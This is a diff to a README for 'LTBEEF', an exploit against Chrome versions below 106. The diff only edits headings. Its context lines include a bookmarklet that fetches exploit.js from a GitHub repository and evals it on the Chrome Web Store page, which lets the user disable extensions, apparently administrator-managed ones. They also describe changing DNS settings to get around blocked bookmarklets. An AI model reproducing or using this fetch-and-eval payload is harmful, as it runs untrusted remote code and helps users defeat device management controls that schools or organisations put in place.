@@ -7,10 +7,10 @@ Please Note: This exploit only works on versions below 106, and eariler versions
 
 The original site created for this exploit can be found at ltbeef.netlify.app
 
-Installation
+# Installation (LTBEEF)
 There are several vesions of this exploit you can use, here are the 2 most common versions:
 
-Bookmarklets
+# Bookmarklets (LTBEEF)
 To use a GUI, bookmark one of the below scripts:
 
 Ingot
@@ -21,7 +21,7 @@ Compact Cow's UI (Dark)
 javascript:void fetch(`https://raw.githubusercontent.com/3kh0/ext-remover/main/exploit.js`).then(d=>d.text()).then(eval);
 Navigate to https://chrome.google.com/webstorex and click on that bookmark. Flip the switches on the extentions you want to disable. Simple!
 
-DNS servers
+# DNS servers (LTBEEF)
 By changing your DNS server, you can use LTBEEF, even if bookmarklets are blocked.
 
 First, go to Settings > Network > Wifi > Network, and click on "Custom Name Servers" image
